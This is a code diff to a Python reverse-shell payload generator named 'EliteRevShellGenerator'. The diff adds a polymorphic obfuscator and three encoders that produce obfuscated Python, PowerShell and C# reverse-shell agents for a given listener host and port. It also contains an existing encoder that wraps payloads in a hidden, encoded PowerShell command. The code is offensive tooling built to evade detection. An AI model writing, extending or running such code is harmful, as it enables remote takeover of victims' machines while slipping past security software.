@@ -8,6 +8,7 @@ Supports multiple categories and encoders
 import base64
 import random
 import string
+from polymorphic_obfuscator import PolymorphicObfuscator
 
 
 class EliteRevShellGenerator:
@@ -17,12 +18,16 @@ class EliteRevShellGenerator:
     
     def __init__(self):
         self.payloads = self._initialize_payloads()
+        self.obfuscator = PolymorphicObfuscator(obfuscation_level='high')
         self.encoders = {
             'None': self._encode_none,
             'Base64': self._encode_base64,
             'URL': self._encode_url,
             'Hex': self._encode_hex,
             'PowerShell Base64': self._encode_powershell_base64,
+            'Polymorphic Python': self._encode_polymorphic_python,
+            'Polymorphic PowerShell': self._encode_polymorphic_powershell,
+            'Polymorphic C#': self._encode_polymorphic_csharp,
         }
     
     def _initialize_payloads(self):
@@ -353,6 +358,52 @@ while 1:
         """PowerShell-specific base64 encoding"""
         encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
         return f'powershell.exe -NoP -NonI -W Hidden -Enc {encoded}'
+    
+    def _encode_polymorphic_python(self, payload, category):
+        """Generate polymorphic Python agent"""
+        # Extract LHOST and LPORT from payload
+        import re
+        lhost_match = re.search(r'"([^"]+)",\s*(\d+)', payload)
+        if lhost_match:
+            lhost = lhost_match.group(1)
+            lport = int(lhost_match.group(2))
+        else:
+            # Fallback to defaults
+            lhost = "127.0.0.1"
+            lport = 4444
+        
+        result = self.obfuscator.obfuscate_python("", lhost, lport)
+        return result['code']
+    
+    def _encode_polymorphic_powershell(self, payload, category):
+        """Generate polymorphic PowerShell agent"""
+        import re
+        # Extract LHOST and LPORT
+        lhost_match = re.search(r'"([^"]+)",\s*(\d+)', payload)
+        if lhost_match:
+            lhost = lhost_match.group(1)
+            lport = int(lhost_match.group(2))
+        else:
+            lhost = "127.0.0.1"
+            lport = 4444
+        
+        result = self.obfuscator.obfuscate_powershell(lhost, lport)
+        return result['code']
+    
+    def _encode_polymorphic_csharp(self, payload, category):
+        """Generate polymorphic C# agent"""
+        import re
+        # Extract LHOST and LPORT
+        lhost_match = re.search(r'"([^"]+)",\s*(\d+)', payload)
+        if lhost_match:
+            lhost = lhost_match.group(1)
+            lport = int(lhost_match.group(2))
+        else:
+            lhost = "127.0.0.1"
+            lport = 4444
+        
+        result = self.obfuscator.obfuscate_csharp(lhost, lport)
+        return result['code']
 
 
 if __name__ == "__main__":
